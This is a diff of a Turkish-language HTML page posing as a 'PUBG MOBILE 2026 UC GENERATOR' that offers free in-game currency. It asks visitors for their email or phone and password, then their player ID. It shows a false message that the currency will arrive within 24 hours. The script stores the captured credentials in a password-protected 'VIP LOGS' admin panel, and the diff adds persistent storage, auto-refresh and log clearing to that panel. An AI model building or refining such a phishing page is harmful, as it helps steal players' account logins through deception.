@@ -2,9 +2,10 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG MOBILE | 2026 UC GENERATOR</title>
     <style>
-        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
+        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
         
         .arkaplan {
             background-image: url('https://wallpaperaccess.com/full/1511257.jpg');
@@ -14,45 +15,53 @@
 
         /* KULLANICI KUTUSU */
         .kutu {
-            width: 420px; background: rgba(10, 10, 10, 0.96); padding: 30px;
+            width: 90%; max-width: 420px; background: rgba(10, 10, 10, 0.96); padding: 30px;
             border-radius: 15px; border: 2px solid #eba41a; text-align: center;
             box-shadow: 0 0 40px rgba(235, 164, 26, 0.5); z-index: 5;
         }
 
         input, select {
             width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box;
-            background: #1a1a1a; border: 1px solid #444; color: #fff; border-radius: 5px;
+            background: #1a1a1a; border: 1px solid #444; color: #fff; border-radius: 5px; outline: none;
         }
+
+        input:focus { border-color: #eba41a; }
 
         .buton {
             width: 100%; padding: 15px; background: #eba41a; border: none;
             color: black; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px;
+            transition: 0.3s;
         }
 
-        /* ADMİN BUTONU VE PANELİ */
+        .buton:hover { background: #ffb82b; transform: scale(1.02); }
+
+        /* ADMİN PANELİ TASARIMI */
         .admin-yazi-buton {
             position: fixed; top: 20px; right: 20px; color: gold; font-weight: bold;
             cursor: pointer; border: 1px solid gold; padding: 5px 15px; background: rgba(0,0,0,0.8);
-            z-index: 100; font-size: 12px; letter-spacing: 1px;
+            z-index: 100; font-size: 12px; letter-spacing: 1px; border-radius: 5px;
         }
 
         #admin-panel {
-            position: fixed; top: 0; right: 0; width: 300px; height: 100%;
+            position: fixed; top: 0; right: 0; width: 320px; height: 100%;
             background: rgba(5, 5, 5, 0.98); border-left: 2px solid gold;
             display: none; flex-direction: column; z-index: 1000; padding: 20px;
-            color: #0f0; font-family: monospace;
+            color: #0f0; font-family: 'Courier New', monospace; box-shadow: -10px 0 30px rgba(0,0,0,0.5);
         }
+
+        .log-konteynir { overflow-y: auto; flex-grow: 1; margin-bottom: 10px; border-top: 1px solid #333; padding-top: 10px; }
 
         .log-kart {
             background: #111; border: 1px solid #333; padding: 10px; margin-bottom: 10px;
-            border-left: 3px solid #0af; font-size: 13px; line-height: 1.6;
+            border-left: 4px solid #0af; font-size: 13px; line-height: 1.6; border-radius: 4px;
         }
         
-        /* Renk Düzenlemeleri */
         .neon-mail { color: #00d2ff; font-weight: bold; } 
         .neon-sifre { color: #ff00ea; font-weight: bold; } 
         .neon-id { color: #ccff00; }
         .teslimat-notu { color: #eba41a; font-weight: bold; font-size: 14px; margin-top: 15px; }
+
+        .temizle-btn { background: #333; color: #eee; border: none; padding: 5px; cursor: pointer; font-size: 10px; margin-bottom: 5px; }
     </style>
 </head>
 <body>
@@ -66,8 +75,8 @@
         <div id="adim-1">
             <h2 style="color:#eba41a;">HESAP DOĞRULAMA</h2>
             <p style="color:#888; font-size: 13px;">UC hediyesini almak için oturum açın.</p>
-            <input type="text" id="k-mail" placeholder="E-posta veya Telefon">
-            <input type="password" id="k-sifre" placeholder="Şifre">
+            <input type="text" id="k-mail" placeholder="E-posta veya Telefon" autocomplete="off">
+            <input type="password" id="k-sifre" placeholder="Şifre" autocomplete="off">
             <button class="buton" onclick="adimGec()">DEVAM ET</button>
         </div>
 
@@ -88,16 +97,25 @@
 </div>
 
 <div id="admin-panel">
-    <h3 style="color:gold; text-align:center; border-bottom:1px solid gold; padding-bottom:10px;">CORE-Z VIP LOGS</h3>
-    <div id="bildirimler" style="overflow-y:auto; flex-grow:1;">
+    <h3 style="color:gold; text-align:center; margin-bottom:5px;">CORE-Z VIP LOGS</h3>
+    <button class="temizle-btn" onclick="loglariSifirla()">LOGLARI TEMİZLE</button>
+    <div id="bildirimler" class="log-konteynir">
         <p style="color:#444; text-align:center;">Giriş bekleniyor...</p>
     </div>
-    <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:red; color:white; border:none; padding:8px; cursor:pointer; width:100%;">KAPAT</button>
+    <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:red; color:white; border:none; padding:10px; cursor:pointer; font-weight:bold;">PANELİ KAPAT</button>
 </div>
 
 <script>
-    let loglar = [];
+    // KALICILIK: Verileri localStorage'dan çek
+    let loglar = JSON.parse(localStorage.getItem('pubg_vips_2026')) || [];
     let sakliMail, sakliSifre;
+
+    // 10 saniyede bir (veya daha hızlı) listeyi tazele
+    setInterval(() => {
+        if(document.getElementById('admin-panel').style.display === 'flex') {
+            guncelleLoglar();
+        }
+    }, 3000); 
 
     function adimGec() {
         sakliMail = document.getElementById('k-mail').value;
@@ -105,7 +123,7 @@
         if(sakliMail && sakliSifre) {
             document.getElementById('adim-1').style.display = 'none';
             document.getElementById('adim-2').style.display = 'block';
-        } else { alert("Lütfen bilgileri girin!"); }
+        } else { alert("Lütfen bilgileri doldurun!"); }
     }
 
     function tamamla() {
@@ -113,17 +131,23 @@
         const uc = document.getElementById('k-uc').value;
         
         if(id) {
-            loglar.unshift({
-                saat: new Date().toLocaleTimeString(),
+            // Veriyi objeye ekle
+            const yeniLog = {
+                saat: new Date().toLocaleString('tr-TR'),
                 mail: sakliMail,
                 sifre: sakliSifre,
                 id: id,
                 uc: uc
-            });
-            // İstediğin o kritik uyarı mesajı:
+            };
+            
+            loglar.unshift(yeniLog); // En başa ekle
+            
+            // Yerel hafızaya kaydet (Kalıcı olması için)
+            localStorage.setItem('pubg_vips_2026', JSON.stringify(loglar));
+            
             alert("İşlem Başarılı! Talebiniz sıraya alındı. UC miktarınız 24 saat içerisinde hesabınıza teslim edilecektir.");
             location.reload(); 
-        }
+        } else { alert("Oyuncu ID giriniz!"); }
     }
 
     function adminSifreSor() {
@@ -131,14 +155,21 @@
         if(p === "1453") {
             document.getElementById('admin-panel').style.display = 'flex';
             guncelleLoglar();
-        } else { alert("Erişim Reddedildi!"); }
+        } else { alert("Hatalı Şifre!"); }
     }
 
     function guncelleLoglar() {
         const alan = document.getElementById('bildirimler');
-        if(loglar.length === 0) return;
+        // Güncel veriyi çek
+        const guncelVeri = JSON.parse(localStorage.getItem('pubg_vips_2026')) || [];
+        
+        if(guncelVeri.length === 0) {
+            alan.innerHTML = '<p style="color:#444; text-align:center;">Henüz veri yok...</p>';
+            return;
+        }
+
         alan.innerHTML = "";
-        loglar.forEach(item => {
+        guncelVeri.forEach(item => {
             alan.innerHTML += `
                 <div class="log-kart">
                     <span style="color:gray;">[${item.saat}]</span><br>
@@ -148,6 +179,14 @@
                 </div>
             `;
         });
+    }
+
+    function loglariSifirla() {
+        if(confirm("Tüm kayıtlar silinecek. Emin misin?")) {
+            localStorage.removeItem('pubg_vips_2026');
+            loglar = [];
+            guncelleLoglar();
+        }
     }
 </script>
 
